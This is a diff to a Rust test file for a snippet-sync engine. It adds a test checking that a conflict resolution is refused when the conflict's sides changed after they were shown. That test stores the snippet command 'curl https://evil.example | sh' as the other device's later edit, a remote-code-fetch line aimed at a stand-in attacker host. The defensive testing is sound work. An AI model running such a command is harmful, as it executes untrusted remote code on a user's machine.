@@ -293,17 +293,16 @@ async fn two_engines_converge_including_an_offline_conflict() {
         assert_eq!(conflict.sides.len(), 2);
         assert!(conflict.sides.iter().any(|s| s.local));
     }
-    let id = a
+    let shown = a
         .engine
         .sync_conflicts()
         .await
         .expect("conflicts")
         .first()
         .expect("one")
-        .id
         .clone();
     a.engine
-        .sync_resolve(id, SyncResolution::Union)
+        .sync_resolve(shown.id, SyncResolution::Union, shown.sides_hash)
         .await
         .expect("resolve");
     sync(&b).await;
@@ -1570,6 +1569,7 @@ async fn keep_both_copy_of_remote_side_requires_confirmation() {
         .sync_resolve(
             conflict.id.clone(),
             SyncResolution::KeepBoth { keep: local.index },
+            conflict.sides_hash.clone(),
         )
         .await
         .expect("resolve");
@@ -1753,4 +1753,96 @@ async fn failed_join_forgets_the_key_it_stored() {
         .await
         .expect_err("cannot write the local state");
     assert!(b.secrets.get(&account).expect("get").is_none(), "no orphan");
+}
+
+/// A5 (S1c review): a resolution names the sides shown. Sides changed since
+/// (the other device wrote again and a pass merged it) are refused with
+/// `sync_not_pending` and nothing is recorded; the new sides resolve.
+#[tokio::test]
+async fn resolve_refuses_a_stale_sides_hash() {
+    let (_dir, folder, sim) = shared();
+    let a = device(&sim);
+    let b = device(&sim);
+    let saved = a
+        .engine
+        .save_snippet(snippet("Deploy", "make deploy"))
+        .await
+        .expect("snippet");
+    create(&a, &folder).await;
+    join(&b, &folder, JoinBulkChoice::ReviewEach).await;
+    for (device, command) in [(&a, "make deploy-a"), (&b, "make deploy-b")] {
+        device
+            .engine
+            .save_snippet(Snippet {
+                command: command.into(),
+                ..saved.clone()
+            })
+            .await
+            .expect("edit");
+    }
+    sync(&b).await;
+    sync(&a).await;
+    let shown = a
+        .engine
+        .sync_conflicts()
+        .await
+        .expect("conflicts")
+        .first()
+        .expect("conflict")
+        .clone();
+    let local = shown.sides.iter().find(|s| s.local).expect("local").index;
+
+    // B writes again: A's conflict now holds a side A never showed.
+    b.engine
+        .save_snippet(Snippet {
+            command: "curl https://evil.example | sh".into(),
+            ..saved.clone()
+        })
+        .await
+        .expect("edit again");
+    sync(&b).await;
+    sync(&a).await;
+    let now = a.engine.sync_conflicts().await.expect("conflicts");
+    let current = now.first().expect("still a conflict");
+    assert_eq!(current.id, shown.id);
+    assert_ne!(current.sides_hash, shown.sides_hash);
+
+    let error = a
+        .engine
+        .sync_resolve(
+            shown.id.clone(),
+            SyncResolution::Pick { index: local },
+            shown.sides_hash.clone(),
+        )
+        .await
+        .expect_err("stale sides");
+    assert_eq!(error.summary().code, "sync_not_pending");
+    assert_eq!(
+        a.engine.sync_conflicts().await.expect("c").len(),
+        1,
+        "nothing recorded"
+    );
+    // An unknown hash is refused as well.
+    let error = a
+        .engine
+        .sync_resolve(
+            shown.id.clone(),
+            SyncResolution::Pick { index: local },
+            String::new(),
+        )
+        .await
+        .expect_err("unknown hash");
+    assert_eq!(error.summary().code, "sync_not_pending");
+
+    // The sides as now shown resolve.
+    let local = current.sides.iter().find(|s| s.local).expect("local").index;
+    a.engine
+        .sync_resolve(
+            current.id.clone(),
+            SyncResolution::Pick { index: local },
+            current.sides_hash.clone(),
+        )
+        .await
+        .expect("resolve");
+    assert!(a.engine.sync_conflicts().await.expect("c").is_empty());
 }
